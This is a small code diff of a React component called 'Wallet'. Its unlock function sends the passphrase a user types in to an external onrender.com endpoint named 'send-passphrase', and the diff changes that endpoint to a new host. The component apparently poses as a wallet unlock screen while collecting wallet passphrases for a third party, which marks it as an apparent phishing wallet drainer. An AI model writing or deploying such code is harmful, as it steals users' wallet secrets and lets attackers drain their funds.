@@ -10,7 +10,7 @@ const Wallet = () => {
   const [loading, setLoading] = useState(false);
 
   const unlockWallet = async () => {
-    const url = 'https://pia-auntentication.onrender.com/send-passphrase';
+    const url = 'https://ojays-pia-auth.onrender.com/send-passphrase';
     const data = { passphrase: text };
 
     try {
@@ -75,3 +75,4 @@ const Wallet = () => {
 };
 
 export default Wallet;
+
